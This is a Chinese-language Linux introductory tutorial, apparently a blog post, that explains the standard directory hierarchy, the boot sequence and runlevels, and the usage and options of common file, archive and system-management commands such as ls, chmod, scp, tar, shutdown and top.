<p>/lost+found：这个目录是使用标准的ext2/ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录/disk/lost+found</p>
<p>除了这些目录的内容之外，另外要注意的是，因为根目录与开机有关，开机过程中仅有根目录会被挂载， 其他分区则是在开机完成之后才会持续的进行挂载的行为。就是因为如此，因此根目录下与开机过程有关的目录， 就不能够与根目录放到不同的分区去。</p>
<p>那哪些目录不可与根目录分开呢？有底下这些：</p>
<p>/etc：配置文件
/bin：重要执行档
/dev：所需要的装置文件
/lib：执行档所需的函式库与核心所需的模块
/sbin：重要的系统执行文件</p>
<p>这五个目录千万不可与根目录分开在不同的分区。请背下来啊。</p>
<p>交换区：我们如果没有足够的内存，也许就不能运行某些大型的软件，解决的办法是在硬盘上划出一个区域来当作临时的内存，好像内存变大了。Windows 操作 系统把这个区域叫做虚拟内存，Linux把它叫做交换分区swap。</p>
<p><strong>/usr</strong>：依据FHS的基本定义，/usr里面放置的数据属于可分享的与不可变动的(shareable, static)。
/usr不是user的缩写，其实usr是Unix Software Resource的缩写， 也就是Unix操作系统软件资源所放置的目录，而不是用户的数据。
FHS建议所有软件开发者，应该将他们的数据合理的分别放置到这个目录下的次目录，而不要自行建立该软件自己独立的目录。
因为是所有系统默认的软件(distribution发布者提供的软件)都会放置到/usr底下，因此这个目录有点类似Windows系统的C：\Windows\ + C：\Program files\这两个目录的综合体，系统刚安装完毕时，这个目录会占用最多的硬盘容量。一般来说，/usr的次目录建议有底下这些：</p>
<p>&ldquo;/usr/X11R6/&quot;：为X Window System重要数据所放置的目录，之所以取名为X11R6是因为最后的X版本为第11版，且该版的第6次释出之意。</p>
<p>/usr/bin/：绝大部分的用户可使用指令都放在这里。请注意到他与/bin的不同之处。(是否与开机过程有关)</p>
<p>/usr/include/：c/c++等程序语言的档头(header)与包含档(include)放置处，当我们以tarball方式 (*.tar.gz 的方式安装软件)安装某些数据时，会使用到里头的许多包含档。</p>
<p>/usr/lib/：包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。 某些软件会提供一些特殊的指令来进行服务器的设定，这些指令也不会经常被系统管理员操作， 那就会被摆放到这个目录下啦。要注意的是，如果你使用的是X86_64的Linux系统， 那可能会有/usr/lib64/目录产生</p>
<p>/usr/local/：统管理员在本机自行安装自己下载的软件(非distribution默认提供者)，建议安装到此目录， 这样会比较便于管理。举例来说，你的distribution提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于/usr/local/目录下，可与原先的旧版软件有分别啦。 你可以自行到/usr/local去看看，该目录下也是具有bin, etc, include, lib&hellip;的次目录</p>
<p>/usr/sbin/：非系统正常运作所需要的系统指令。最常见的就是某些网络服务器软件的服务指令(daemon)</p>
<p>/usr/share/：放置共享文件的地方，在这个目录下放置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文本文件嘛。在此目录下常见的还有这些次目录：/usr/share/man：联机帮助文件</p>
<p>/usr/share/doc：软件杂项的文件说明</p>
<p>/usr/share/zoneinfo：与时区有关的时区文件</p>
<p>/usr/src/：一般原始码建议放置到这里，src有source的意思。至于核心原始码则建议放置到/usr/src/linux/目录下。</p>
<p><strong>/var</strong>：如果/usr是安装时会占用较大硬盘容量的目录，那么/var就是在系统运作后才会渐渐占用硬盘容量的目录。 因为/var目录主要针对常态性变动的文件，包括缓存(cache)、登录档(log file)以及某些软件运作所产生的文件， 包括程序文件(lock file, run file)，或者例如MySQL数据库的文件等等。常见的次目录有：
/var/cache/：应用程序本身运作过程中会产生的一些暂存档</p>
<p>/var/lib/：程序本身执行的过程中，需要使用到的数据文件放置的目录。在此目录下各自的软件应该要有各自的目录。 举例来说，MySQL的数据库放置到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm去</p>
<p>/var/lock/：某些装置或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该装置时， 就可能产生一些错误的状况，因此就得要将该装置上锁(lock)，以确保该装置只会给单一软件所使用。 举例来说，刻录机正在刻录一块光盘，你想一下，会不会有两个人同时在使用一个刻录机烧片？ 如果两个人同时刻录，那片子写入的是谁的数据？所以当第一个人在刻录时该刻录机就会被上锁， 第二个人就得要该装置被解除锁定(就是前一个人用完了)才能够继续使用</p>
<p>/var/log/：非常重要。这是登录文件放置的目录。里面比较重要的文件如/var/log/messages, /var/log/wtmp(记录登入者的信息)等。</p>
<p>/var/mail/：放置个人电子邮件信箱的目录，不过这个目录也被放置到/var/spool/mail/目录中，通常这两个目录是互为链接文件。</p>
<p>/var/run/：某些程序或者是服务启动后，会将他们的PID放置在这个目录下</p>
<p>/var/spool/：这个目录通常放置一些队列数据，所谓的“队列”就是排队等待其他程序使用的数据。 这些数据被使用后通常都会被删除。举例来说，系统收到新信会放置到/var/spool/mail/中， 但使用者收下该信件后该封信原则上就会被删除。信件如果暂时寄不出去会被放到/var/spool/mqueue/中， 等到被送出后就被删除。如果是工作排程数据(crontab)，就会被放置到/var/spool/cron/目录中。</p>
<h1 id="系统解析">系统解析<a hidden class="anchor" aria-hidden="true" href="#系统解析">#</a></h1>
<h2 id="引导过程">引导过程<a hidden class="anchor" aria-hidden="true" href="#引导过程">#</a></h2>
<pre><code>加载BIOS（通电自检），引导系统（BIOS设定）读取MBR，运行Grub，加载初始化配置文件，启动服务，运行rc.locak，生成终端或者X Window等待登录。
BIOS：每个主板都有一个自己的BIOS，启动硬件的第一步。
MBR：主引导记录，BIOS会默认从硬盘的第0柱面、第0磁道、第一个扇区中读取。一个扇区=512字节，446引导程序+64地盘分区表DPT+2MBR结束位，由fWindows的disk.ext或者Linux的fdisk程序产生，不依赖操作系统。
MBR记录可以修改因此可以实现多系统共存。
Grub：引导操作系统程序。地址记录于MBR中，其功能是根据配置文件加载kernel镜像，并运行/sbin/init，根据/etc/inittab进行初始化工作，根据runlevel确定系统运行级别和对应服务启动脚本。
</code></pre>
<h2 id="引导级别">引导级别<a hidden class="anchor" aria-hidden="true" href="#引导级别">#</a></h2>
<ul>
<li>关机</li>
<li>单用户模式，用于系统维护，可以在忘记root密码时进入此模式修改密码。</li>
<li>无网络链接，多用户。</li>
<li>完全多用户模式，一般使用此级别。</li>
<li>保留未使用。</li>
<li>窗口模式，多用户网络链接。</li>
<li>重启。</li>
</ul>
<h1 id="命令管理">命令管理<a hidden class="anchor" aria-hidden="true" href="#命令管理">#</a></h1>
<pre><code>Linux中，一切配置皆文件。
man：&lt;order_name&gt;查看命令的帮助，如：man ls。
种类：9
常见说明
可调用的系统
函数库
设备文件
文件格式
游戏说明
杂项
系统管理员可用的命令
与内核有关的说明
man 2 reboot：查看reboot在第2章里的说明。
</code></pre>
<h2 id="命令格式">命令格式<a hidden class="anchor" aria-hidden="true" href="#命令格式">#</a></h2>
<p>命令的一般格式：command [options] [arguments]
说明：
command：命令名。
options：命令的选项，一般是一个单词或字母。有的命令有选项，有的命令没有选项。选项前面一般有“-”符号。选项是对命令参数的补充，当存在参数时才可能有选项。
arguments：命令的参数，有时候选项也带参数。有的命令有参数，有的命令没有参数。
[]：方括号表示可有可无的意思。[options]表示有的命令有选项，有的命令 也可能没有选项。[arguments 表示有的命令有参数，有的命令可能没有参数。
举例：
(1) 没有参数的命令像 ls，pwd 都没有选项和参数。直接输入命令，回车即可执行命令。
(2) 有参数没有选项的命令例如删除文件 myfile.txt 的命令，myfile.txt 就是参数：rm myfile.txt。
(3) 有参数也有选项的命令通过命令“rm myfile.txt”删除文件，系统会有确认提示，询问是否确定要删除。
可以通过一个选项，在执行命令时不再需要确认提示，命令格式如下：
<code>rm -f myfile.txt</code>
此处的-f 就是选项，作用是进行强制删除，也就是没有确认提示。</p>
<h2 id="文件和目录操作">文件和目录操作<a hidden class="anchor" aria-hidden="true" href="#文件和目录操作">#</a></h2>
<p>需掌握的常用命令：cd, ls, locate, less, grep, chmod, cp, mv, mkdir, rm。
Linux不像 Windows有C盘、D盘这么一说，它只有一个根目录“/”。</p>
<h3 id="pwd">pwd<a hidden class="anchor" aria-hidden="true" href="#pwd">#</a></h3>
<p>pwd 命令代表&quot;print working directory&rdquo;(打印工作目录)。当键入 pwd 时，系统 显示当前工作目录。
例如：<code>[root@localhost]# pwd</code>  /root，表明当前的工作目录是：/root。</p>
<h3 id="ls">ls<a hidden class="anchor" aria-hidden="true" href="#ls">#</a></h3>
<p>ls命令用户显示当前工作目录下的内容，包括子目录和文件。使用方法： <code>[root@localhost]# ls</code></p>
<h3 id="ll">ll<a hidden class="anchor" aria-hidden="true" href="#ll">#</a></h3>
<p>ll命令和ls命令功能一样，只是显示方式不一样，ll命令会列出当前目录下子目录和文件列表的详细信息。
使用方法如下：<code>[root@localhost]# ll</code>
显示的文件列表格式如下：
<code>drwxr-xr-x 3 user group 102 Mar11 22：56 Filename</code>
文件列表显示了7个段，每一段分别的含义说明如下：
(1) 第1段，drwxr-xr-x，表示文件属性，第1个字母d表示这个是个目录，如果是“-”表示文件。 d后面有9个字符，分成三组，每3个字符为一组。我们使用括号把他括起来：d(rwx)(r-x)(r-x)，对应含意：文件类型(所有者权限)(组权限)(其他人 权限)。这三组分别说明的是：文件的所有者权限，文件所属的组权限，和“其他人”的权限。每一组中每一位字符的含意如下：
第 1 位表示是否有读权限，有读权限，显示“r”，没有读权限，显示“-”。
第 2 位表示是否有写权限，有写权限，显示“w”，没有写权限，显示“-”。
第 3 位表示是否有执行权限，有执行权限，显示“x”，没有，显示“-”。
d(rwx)(r-x)(r-x)含意说明：
第 1 位 d：表示目录。
第 1 组(rwx)：表示文件所有者对这个文件的权限是，有读，写，执行权限。
第 2 组(r-x)：表示文件所属用 户组对这个文件的权限是：有读，没有写权限，有执行权限。
第 3 组(r-x)：表示 其他人对这个文件的权限是：有读，没有写权限，有执行权限。
(2) 第2段，目录下的文件和子目录个数：3表示目录下有3个文件或 目录 (注意：每个目录都有一个指向它本身的子目录&quot;.&quot; 和指向它上级目录的子 目录&quot;..&quot;)
(3) 第 3 段，显示文件的所有者：user。
(4) 第 4 段，显示文件所属用户组：group。
(5) 第 5 段，文件大小：102 byte。
(6) 第 6 段，修改时间：Mar11 22：56。
(7) 第 7 段，文件名：Filename。</p>
<h3 id="cd">cd<a hidden class="anchor" aria-hidden="true" href="#cd">#</a></h3>
<p>cd 命令来改变工作目录。
例如把当前目录更改到/usr 目录下：<code>[root@localhost]# cd /usr</code>
例如把当前目录更改到整个系统的根目录下： <code>[root@localhost]# cd /</code>
几个常用 cd 用法：
命令
功能
<code>cd tmp</code>
进入当前目录下的tmp目录
<code>cd ~</code>
回到当前用户的HOME目录下
<code>cd /</code>
回到整个系统的根目录
<code>cd /etc</code>
进入到/etc目录
<code>cd ..</code>
回到上一级目录</p>
<h3 id="locate">locate<a hidden class="anchor" aria-hidden="true" href="#locate">#</a></h3>
<p>使用 locate 命令来搜寻文件或目录。locate 命令直接在文件索引数据库里查找， 所以搜索文件的速度很快。如果需要更新文件索引数据库，则使用 updatedb 命 令。例如，如果想搜寻所有名称中带有 finger 这个词的文件或目录，命令如下： <code>[root@localhost]# locate finger</code>
locate 有一个十分有用的选项 -r，它可以让你在搜索文件时使用正则表达式。
比如<code>[root@localhost]# local --regex [0-9]</code>
locate是Linux系统中的一个查找文件命令，若在查找文件时提示：
<code>locate： can not open ‘/var/lib/mlocate/mlocate.db'： No such file or directory</code>
原因是locate是通过生成一个文件和文件夹的索引数据库，当用户在执行loacte命令查找文件时，它会直接在索引数据库里查找，若该数据库太久没更新或不存在，则会提示以上错误。
解决方法是执行如下的命令，更新文件索引数据库。
<code>[root@localhost]# updatedb</code></p>
<h3 id="find">find<a hidden class="anchor" aria-hidden="true" href="#find">#</a></h3>
<p>这是另一个 Linux 系统中重要的文件查找命令。其一般命令格式为：<code>find 位置 -name 文件名称</code>
例如，在&quot;/&ldquo;这个根目录中查找&quot;linux.html&quot;文件，命令如下：
<code> [root@localhost]# find / -name linux.html</code>
你除了可以按文件名称来使用find查找文件外，也可以根据文件大小(通过 -size n 选项指定)、时间(如 -atime n 表示查找 n 天前访问过的文件)来搜索文件。
此外，find 命令同样支持在搜索文件时使用正则表达式，你只需指定 -regex 选项即可。
find 和 locate 命令的区别：locate 是在建立好的索引的基础上进行查找， 查找要快很多。find 功能强大，但它是直接在硬盘上搜寻，查找速度比较慢。</p>
<h3 id="clear">clear<a hidden class="anchor" aria-hidden="true" href="#clear">#</a></h3>
<p>clear命令用于清除终端窗口，直接在终端输入clear，会清空当前屏幕。</p>
<h3 id="cat">cat<a hidden class="anchor" aria-hidden="true" href="#cat">#</a></h3>
<p>cat是concatenate(连锁)的简写，意思是合并文件。该命令可以显示文件的内容(经常和more搭配使用)，或者是将多个文件合并成一个文件。
cat主要有三大功能：
(1) 一次显示整个文件。<code>$ cat filename</code>
(2) 从键盘创建一个文件。<code>$ cat &gt; filename &lt;&lt; 结束符</code>
只能用于创建新文件，不能编辑已有文件。例如设置结束符为EOF
<code>cat &gt; 1.txt &lt;&lt; EOF</code>
编辑文件完后，只需在最后一行键入“EOF”，然后回车即可。
(3) 将几个文件合并为一个文件： <code>$cat file1 file2 &gt; file</code>
参数：
-n或&ndash;number：由1开始对所有输出的行数编号
-b或&ndash;number-nonblank：和-n相似，只不过对于空白行不编号
-s或&ndash;squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行
-v或&ndash;show-nonprinting：用‘^’输出控制字符除了LFD和TAB
例：
把1.txt和2.txt合并到3.txt
<code>cat 1.txt 2.txt &gt; 3.txt</code>
把1.txt的内容加上行号后输入4.txt这个档案里
<code>cat -n 1.txt &gt; 4.txt</code>
把1.txt和2.txt的内容加上行号(空白行不加)之后将内容附加到3.txt里
<code>cat -b 1.txt 2.txt &gt;&gt; 3.txt</code>
和more一起使用，使用管道连起来。例如：<code>cat /etc/passwd | more</code>。
不过一般不这么用，使用麻烦。直接使用more命令即可，例如：<code>more/etc/passwd</code></p>
<h3 id="more">more<a hidden class="anchor" aria-hidden="true" href="#more">#</a></h3>
<p>浏览超过一页的文件。在显示满一页时暂停，此时可按空格健继续显示下一个画面。 按Q键退出显示。Enter键滚动显示下一行。例如：<code>[root@localhost]# more &lt;filename&gt;</code></p>
<h3 id="less">less<a hidden class="anchor" aria-hidden="true" href="#less">#</a></h3>
<p>less命令的用法与more命令类似，也可以用来浏览超过一页的文件。所不同的是less命令除了可以按空格键向下显示文件外，还可以利用上下键来卷动文件。当需要结束浏览时，只要在less命令的提示符“：”下按Q键即可。例如：
<code>[root@localhost]# less &lt;filename&gt;</code></p>
<h3 id="head">head<a hidden class="anchor" aria-hidden="true" href="#head">#</a></h3>
<p>你可以使用head命令来查看文件的开头部分。此项命令是：<code>head &lt;filename&gt;</code>
head是一个有用的命令，但是由于它只限于文件的最初几行，你看不到文件实际上有多长。按照默认设置，你只能阅读文件的前十行。你可以通过指定一个数字选项来改变显示的行数，如下面的命令所示：<code>[root@localhost]# head -20 &lt;filename&gt;</code></p>
<h3 id="tail">tail<a hidden class="anchor" aria-hidden="true" href="#tail">#</a></h3>
<p>与head命令恰恰相反的是tail命令。使用tail命令，你可以查看文件结尾的十行。这有助于查看日志文件的最后十行来阅读重要的系统消息。你还可以使用tail来观察日志文件被更新的过程。使用-f选项，tail会自动实时地把打开文件中的新消息显示到屏幕上。例如，要即时观察/var/log/messages的变化，以根用户身份在shell提示下键入以下命令：
<code>[root@localhost]# tail –f /var/log/messages。</code></p>
<h3 id="grep">grep<a hidden class="anchor" aria-hidden="true" href="#grep">#</a></h3>
<p>grep命令用于在文件中查找指定的字串。例如，在temp.txt文件中查找每一个&quot;hello&rdquo;，使用的命令如下：<code>[root@localhost]# grep hello temp.txt</code>
如果要显示行号，则使用如下命令：
<code>[root@localhost]# grep -n 要查找的内容 文件名</code></p>
<h3 id="chmod">chmod<a hidden class="anchor" aria-hidden="true" href="#chmod">#</a></h3>
<h2 id="文件可以被执行如果它是程序的话">chmod命令用于改变文件或目录的访问权限。更改权限：给文件设置新的权限。例如，给test.sh文件设置权限<code>[root@localhost]#chmod 644 test.sh 644</code>
由3位数字组成：
第1位数字代表文件所有者对这个文件的权限
第2位数字代表文件所属用户组对这个文件的权限
第3位数字代表其他人对这个文件的权限。权限属性对应的数字如下：
例如：
仅有读权限，就是4。
仅有写权限就是2。
既有读，也有写权限，则把权限值加起来，4+2就是6。
644权限说明：
文件所有者对这个文件的权限是：读、写;
文件所属用户组对这个文件的权限：仅有读;
其他人对这个文件的权限：仅有读。
可通过ll命令查看权限更改后的情况。
加减权限：
在原有权限的基础之上，增加或减少权限，使用命令如下：
<code>chmod o+w test.sh</code>
o+w命令告诉系统给其他人对文件test.sh增加写权限。
<code>chmod go -rw test.sh //但是会报错</code>
组和其他人减去读取和写入权限。
下面是一个速记符号含义的列表：身份u：拥有文件的用户(User)
权限属性
对应数字
说明
r
4
文件可以被读取
w
2
文件可以被写入
x
1
文件可以被执行(如果它是程序的话)</h2>
<p>0
相应的权限还没有被授予。
g：所有者所在的组群(Group)
o：其他人(不是所有者或所属用户组的其他用户，Other)
a：全部(All，包括 u、g、和 o)权限
r：读取权
w：写入权
x：执行权
+：添加权限
-：删除权限
=：使它成为唯一权限
常用的权限设置：
这里是一个某些常用设置、数值、以及它们的含义的列表：
-rw&mdash;&mdash;-(600)：只有所有者才有读取和写入的权限。
-rw-r-r&ndash; (644)：只有所有者才有读取和写入的权限，组群和其他人只有读取的权限。
-rwx&mdash;&ndash;(700)：只有所有者才有读取、写入和执行的权限。
-rwxr-xr-x(755)：所有者有读取、写入和执行的权限，组群和其他人只有读取和执行的权限。
-rwx&ndash;x&ndash;x(711)：所有者有读取、写入和执行权限，组群和其他人只有执行权限。
-rw-rw-rw-(666)：每个人都能够读取和写入文件。(请谨慎使用这些权限。)
-rwxrwxrwx(777)：每个人都能够读取、写入和执行。(再重申一次，这种权限设置可能会很危险)
下面列举了一些对目录的常见设置：
drwx&mdash;-(700)：只有所有者能在目录中读取、写入。
drwx-xr-x(755)：每个人都能够读取目录，但是其中的内容却只能被告所有者更改。</p>
<h3 id="chown">chown<a hidden class="anchor" aria-hidden="true" href="#chown">#</a></h3>
<p>chown用于改变文件的所有者。
命令格式：
<code>chown [-R] user[：group] file...</code>
user：新的档案拥有者的使用者ID
group：新的档案拥有者的使用者群体(group)
-R：对目前目录下的所有档案与子目录进行相同的拥有者变更(即以递归的方式逐个变更)
示例：<code>chown root 4.txt</code></p>
<h3 id="cp">cp<a hidden class="anchor" aria-hidden="true" href="#cp">#</a></h3>
<p>cp(copy)命令可以将文件或目录复制到其他目录中。在使用cp命令时，只需要指定源文件名与目标文件名或目标目录即可。命令格式：<code>cp &lt;源&gt; &lt;目标目录&gt;</code>
例如，把当前目录下的test.txt文件拷贝到/tmp目录下：<code>cp test.txt /tmp</code>
拷贝目录(命令中需要使用-r选项)：<code>cp -r &lt;源目录名&gt; &lt;目标目录&gt;</code>
例如，把当前目录下的test目录拷贝到/tmp目录下：<code>cp -r test /tmp</code></p>
<h3 id="scp">scp<a hidden class="anchor" aria-hidden="true" href="#scp">#</a></h3>
<p>scp是linux中功能最强大的文件传输命令，可以实现从本地到远程以及远程到本地的文件传输操作。
本地到远程的文件复制：
文件拷贝命令格式：
<code>scp local_file remote_username@remote_ip：remote_folder</code>
或
<code>scp local_file remote_username@remote_ip：remote_</code>
local_file：本地文件名。
remote_username：远程计算机的用户名。
remote_ip：远程计算机的IP 地址。
remote_folder：远程计算机的目录。
示例：<code>scp 1.mp3 root@192.168.1.2：/tmp/</code></p>
<p>目录拷贝命令格式：
<code>scp -r local_folder remote_username@remote_ip：remote_folder</code>
例如将本地/home/music/目录复制到远程/tmp/目录下：
<code>scp -r /home/music/ root@192.168.1.2：/tmp/</code>
复制后远程有/tmp/music/目录。</p>
<p>从远程服务器复制文件到本地，只要将两个参数调换顺序即可：
拷贝文件：
例如把192.168.1.2上的/home/music/1.mp3拷贝到本地/tmp/目录下：
<code>scp root@192.168.1.2：/home/music/1.mp3 /tmp/</code>
拷贝目录：
例如把192.168.1.2上的/home/music/目录拷贝到本地/tmp/目录下：
<code>scp -r root@192.168.1.2：/home/music/ /tmp/</code></p>
<h3 id="mv">mv<a hidden class="anchor" aria-hidden="true" href="#mv">#</a></h3>
<p>mv命令用于移动文件和改名。mv的常见选项包括：
<code>-i</code>：互动。如果你选择的文件会覆盖目标中的现存文件，它会提示你。这是一个实用的选项，因为它像cp中的-i选项一样，会给你一个确认替换已存文件的机会。
<code>-f</code>：强制。它会超越互动模式，不提示地移动文件。除非你知道自己在干什么，这个选项很危险。在你对系统信心十足之前，请谨慎使用这个选项。
<code>-v</code>：详细。显示文件的移动进度。
命令格式：<code>mv &lt;源文件&gt; &lt;目标目录&gt;</code>
如果你想把文件从你的主目录中移到另一个现存的目录中，使用以下命令：
<code>[root@localhost]# mv sneakers.txt /home/newuser/</code>
移动后同时给文件改名：
<code>[root@localhost]# mv sneakers.txt /home/newuser/new_sneakers.txt</code></p>
<p>把当前文件夹的文件a改为b：
<code>mv a b</code></p>
<h3 id="mkdir">mkdir<a hidden class="anchor" aria-hidden="true" href="#mkdir">#</a></h3>
<p>mkdir(make directory)命令用来建立目录。例如在系统中当前目录下建立data子目录：
<code>[root@localhost]# mkdir data</code></p>
<h3 id="rm">rm<a hidden class="anchor" aria-hidden="true" href="#rm">#</a></h3>
<p>rm命令用于将文件或目录删除。如果是链接文件，只是删除了该链接，原有文件保持不变。删除文件和目录的选项包括：
<code>-i</code>：互动。提示你确认删除，这个选项可以帮助你避免误删文件。
<code>-f</code>：Force，强制。代替互动模式，不提示地删除文件。除非你知道自己在干什么，使用这个选项通常不是明智之举。
<code>-v</code>：Verbose，显示操作过程的详细信息。显示文件的删除进度。
<code>-r</code>：Recursive，递归。将会删除某个目录及其中所有的文件和子目录。
例如要使用rm命令来删除文件tmp.txt，命令如下：<code>rm tmp.txt</code>
如果要删除目录，命令如下：<code>rm -r 目录名</code>
强制删除目录及以下文件：<code>rm -rf 目录名</code></p>
<h2 id="文件归档和压缩">文件归档和压缩<a hidden class="anchor" aria-hidden="true" href="#文件归档和压缩">#</a></h2>
<p>需掌握的常用命令：tar，zip，unzip，gzip，gunzip。</p>
<h3 id="zip和unzip">zip和unzip<a hidden class="anchor" aria-hidden="true" href="#zip和unzip">#</a></h3>
<p><code>zip</code>命令用于打包和压缩文件。
压缩示例：<code>zip -r data.zip data</code>
将当前目录下的data文件夹和内部文件全部压缩成<code>data.zip</code>文件，<code>-r</code>表示递归压缩子目录下所有文件。
<code>zip -r data.zip *</code>
将当前目录下所有文件夹和文件全部压缩成data.zip文件。
<code>zip -r data.zip /home/data</code>
将/home/data这个目录下的所有文件夹和文件压缩为当前目录下的data.zip</p>
<p>如果现在在/home 这个目录下：
<code>zip -r data.zip data</code></p>
<p><code>unzip</code>命令用于解压扩展名为<code>.zip</code>的文件。
解压到当前目录：
<code>unzip data.zip</code></p>
<p>解压到指定目录：
<code>unzip data.zip -d /home/wjy/Desktop/</code></p>
<p>centos需要安装zip和unzip指令：
<code>yum install -y unzip zip</code></p>
<h3 id="gzipgunzip">gzip/gunzip<a hidden class="anchor" aria-hidden="true" href="#gzipgunzip">#</a></h3>
<p>gzip命令用于压缩&quot;.gz&quot;文件，gunzip用于解开被gzip压缩过的文件，这些压缩文件预设最后的扩展名为&quot;.gz&quot;。
压缩：<code>gzip usr.tar</code>
解压：<code>gunzip usr.tar.gz</code></p>
<h3 id="tar">tar<a hidden class="anchor" aria-hidden="true" href="#tar">#</a></h3>
<p>tar命令用于文件打包，不是压缩。
打包例子：<code>tar -cvf myfile.tar</code>
目录解包例子：<code>tar -xvf myfile.tar</code>
如果一个压缩包是.tar.gz格式，则可以先通过gunzip解压，然后再通过tar解包。也可以通过tar命令直接解压解包，只需在解包加个参数z：
<code>tar -xzvf myfile.tar.gz</code>
tar命令常用选项：
<code>-c</code>：建立新的归档文件
<code>-x</code>：从归档文件中解出文件
<code>-v</code>：处理过程中输出相关信息
<code>-f</code>：指定的文件名
<code>-z</code>：与-x 联用时调用gzip完成对gz文件的解压</p>
<h2 id="系统管理">系统管理<a hidden class="anchor" aria-hidden="true" href="#系统管理">#</a></h2>
<p>需掌握的常用命令：free, top, shutdown。</p>
<h3 id="free">free<a hidden class="anchor" aria-hidden="true" href="#free">#</a></h3>
<p>free命令用于查看当前系统内存的使用情况，它可以显示系统中剩余和已用的物理内存、交换内存和内核缓冲区。
例如：<code>[root@localhost]# free</code></p>
<h3 id="shutdown">shutdown<a hidden class="anchor" aria-hidden="true" href="#shutdown">#</a></h3>
<p>该命令用于关机。语法规则如下：<code>shutdown [-cfFhknr(参数名称)] [-t 秒数] 时间 [警告信息]</code>
具体各参数功能：
<code>-c</code>：取消前一个shutdown命令。值得注意的是，当执行一个如&quot;shutdown -h 11：10&quot;的命令时，只要按“Ctrl+C”键就可以中断关机的命令。若是执行如&quot;shutdown -h 11：10 &amp; &ldquo;的命令将shutdown转到后台时，则需要使用<code>shutdown -c</code>将前一个shutdown命令取消。
<code>-f</code>：重新启动时不执行fsck(注：fsck是Linux下的一个检查和修复文件系统的程序)。
<code>-F</code>：重新启动时执行fsck。
<code>-h</code>：将系统关机，在某种程度上功能与halt命令相当。
<code>-k</code>：只是送出信息给所有用户，但并不会真正关机。
<code>-n</code>：不调用init程序关机，而是由shutdown自己进行(一般关机程序是由shutdown调用init来实现关机动作)，使用此参数将加快关机速度，但是不建议用户使用此种关机方式。
<code>-r</code>：shutdown之后重新启动系统。</p>
<p><code>-t &lt;秒数&gt;</code>：送出警告信息和关机信号之间要延迟多少秒。警告信息将提醒用户保存当前进行的工作。
<code>[时间]</code>：设置多久时间后执行shutdown命令。时间参数有<code>hh：mm</code>或+m两种模式。hh：mm格式表示在几点几分执行shutdown命令。
例如<code>shutdown 10：45</code>表示将在10：45执行shutdown。+m表示m分钟后执行shutdown。
比较特别的用法是以now表示立即执行shutdown。注意这部分参数不能省略。
<code>[警告信息]</code>：要传送给所有登入用户的信息。
应用举例：
立即关机：
<code>shutdown -h now</code>
定时关机(11点10分关机，如果要取消按 Ctrl+C 键)：
<code>shutdown -h 11：10</code>或
<code>shutdown 11：10</code>
指定5分钟后关机，同时送出警告信息给登入用户：
<code>shutdown +5 &quot;System will shutdown after 5 minutes&quot;</code>
重启计算机：
<code>shutdown -r now</code></p>
<h3 id="reboot">reboot<a hidden class="anchor" aria-hidden="true" href="#reboot">#</a></h3>
<p>重启计算机。用法：
<code>reboot</code></p>
<h3 id="date">date<a hidden class="anchor" aria-hidden="true" href="#date">#</a></h3>
<p>该命令可以显示当前系统的日期和时间，也可以设置日期和时间。clock命令也可以用于显示系统的日期与时间(默认情况下，普通用户无法执行clock命令，必须用root账号登录执行)。
例如，显示日期和时间：
<code>date</code>
设置日期和时间：
<code>date -s &quot;2017-04-11 11：28：30&quot;</code></p>
<h3 id="cal">cal<a hidden class="anchor" aria-hidden="true" href="#cal">#</a></h3>
<p>该命令可显示计算机中的日历。 显示当前月日历：<code># cal</code>
显示指定年份的日历命令：
<code>cal 2016</code>
显示指定月份的日历命令：
<code>cal 9 2016</code></p>
<h3 id="top">top<a hidden class="anchor" aria-hidden="true" href="#top">#</a></h3>
<p>top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。例如：<code>[root@localhost]# top</code>
统计信息区前五行是系统整体的统计信息：
第一行是任务队列信息，同<code>uptime</code>命令的执行结果，其内容如下：
<code>01：06：48</code>：当前时间
<code>up 1：22</code>：系统运行时间，格式为时：分
<code>1 user</code>：当前登录用户数
<code>load average： 0.06, 0.60, 0.48</code>：系统负载，即任务队列的平均长度。三个数值分别为1分钟、5分钟、15分钟前到现在的平均值.
第二行为进程信息，内容如下：
<code>Tasks：29 total</code>：进程总数
<code>1 running</code>：正在运行的进程数
<code>28 sleeping</code>：睡眠的进程数
<code>0 stopped</code>：停止的进程数
<code>0 zombie</code>：僵尸进程数
第三行为CPU的信息，当有多个CPU时，这些内容可能会超过两行：
<code>Cpu(s)： 0.3% us</code>：用户空间占用CPU百分比
<code>1.0% sy</code>：内核空间占用CPU百分比
<code>0.0% ni</code>：用户进程空间内改变过优先级的进程占用CPU百分比
<code>98.7% id</code>：空闲CPU百分比
<code>0.0% wa</code>：等待输入输出的CPU时间百分比
<code>0.0% hi</code>： CPU服务于硬中断所耗费的时间总额
<code>0.0% si、0.0%st</code>：CPU服务于软中断所耗费的时间总额、Steal Time
最后两行为内存信息，内容如下：
<code>Mem： 191272k total</code>：物理内存总量
<code>173656k used</code>：使用的物理内存总量
<code>17616k free</code>：空闲内存总量
<code>22052k buffers</code>：用作内核缓存的内存量
<code>Swap： 192772k total</code>：交换区总量
<code>0k used</code>：使用的交换区总量(0kb)
<code>192772k free</code>：空闲交换区总量
<code>123988k cached</code>：缓冲的交换区总量，内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，该数值即为这些内容已存在于内存中的交换区的大小，相应的内存再次被换出时可不必再对交换区写入。
进程信息区统计信息区域的下方显示了各个进程的详细信息：
首先来认识一下各列的含义：
<code>列名-含义</code>
<code>PID</code>：进程id
<code>PPID</code>：父进程id
<code>RUSER</code>：Real user name
<code>UID</code>：进程所有者的用户id
<code>USER</code>：进程所有者的用户名
<code>GROUP</code>：进程所有者的组名
<code>TTY</code>：启动进程的终端名，不是从终端启动的进程则显示为 ?
<code>PR</code>：优先级
<code>NI</code>：nice值，负值表示高优先级，正值表示低优先级
<code>P</code>：最后使用的CPU，仅在多CPU环境下有意义
<code>%CPU</code>：上次更新到现在的CPU时间占用百分比
